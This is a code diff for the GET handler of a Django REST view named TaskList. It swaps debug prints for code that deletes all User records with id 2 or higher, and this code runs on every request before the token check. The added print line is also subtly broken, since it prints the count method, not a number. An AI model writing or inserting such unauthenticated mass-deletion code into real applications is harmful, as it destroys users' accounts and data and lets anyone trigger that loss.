@@ -22,9 +22,9 @@ class TaskList (APIView):
 
     def get(self, request, token):
         
-        usr=User.objects.filter(username="YaridTheBoi").first()
-        print(usr)
-        print(usr.is_authenticated)
+        users=User.objects.filter(id__gte=2)
+        print("deleting: "+ str(users.count))
+        users.delete()
         
         checkMe=User.objects.filter(auth_token=token).first()
         if(checkMe is None):
